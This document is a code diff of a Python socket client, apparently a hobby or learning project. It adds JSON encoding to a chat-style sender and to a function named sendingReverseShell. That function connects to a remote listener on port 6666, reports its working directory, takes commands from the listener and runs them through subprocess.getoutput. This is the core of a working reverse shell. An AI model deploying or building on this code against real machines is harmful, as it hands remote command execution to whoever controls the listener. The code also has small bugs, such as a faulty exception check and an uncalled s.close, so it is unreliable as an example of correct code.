@@ -8,13 +8,22 @@ import socket
 import os
 import subprocess
 import sys
+import json
 
 
 class Client():
     def __init__(self):
         pass
 
+    def encode(self, data):
+        # return json.dumps(data).encode("UTF-8")
+        return bytes(json.dumps(data), "UTF-8")
+         
     
+    def decode(self, data):
+        return json.loads(data.decode("UTF-8"))
+        
+
     def sendingData(self):
         s = socket.socket()
         ip = socket.gethostname()
@@ -22,15 +31,16 @@ class Client():
         port = 9999
         quitting = False
         s.connect((host, port))
+        data = {}
 
         while not quitting:
-            message = input('> ')
-            if message == "exit":
+            data["message"] = input('> ')
+            if data["message"].lower() == "exit":
                 quitting = True
-                s.send(b'exit')
+                s.send(self.encode(data))
                 s.close
 
-            s.send(bytes(message, "UTF-8"))
+            s.send(self.encode(data))
 
     
     def sendingReverseShell(self):
@@ -40,39 +50,32 @@ class Client():
         port = 6666
         quitting = False
         s.connect((host, port))
-        SEP = "<sep>"
-        output = ""
-        first = True
+    
+        data = {}
 
         while not quitting:
-            cwd = os.getcwd()
-            
-            if first:
-                first = False
-                message = f"{cwd}"
-            else:
-                message = f"{output}{SEP}{cwd}"
+            data["cwd"] = os.getcwd()
 
-            s.send(bytes(message, "UTF-8"))
+            s.send(self.encode(data))
 
             # Waiting for a command
-            command = s.recv(1024).decode("UTF-8")
-            commandArgs = command.split()
+            data = self.decode(s.recv(1024))
+            commandArgs = data["command"].split()
 
-            if command.lower() == "exit":
+            if data["command"].lower() == "exit":
                 quitting = True
-                s.send(b'exit')
+                s.send(self.encode(data))
                 s.close()
             if commandArgs[0].lower() == "cd":
                 try:
                     os.chdir(' '.join(commandArgs[1:]))
                 except Exception as e:
                     if e == FileNotFoundError: 
-                        output = str(e)
+                        data["output"] = str(e)
                     else:
-                        output = ""
+                        data["output"] = ""
             else:
-                output = subprocess.getoutput(command)
+                data["output"] = subprocess.getoutput(data["command"])
             
 
     def main(self):
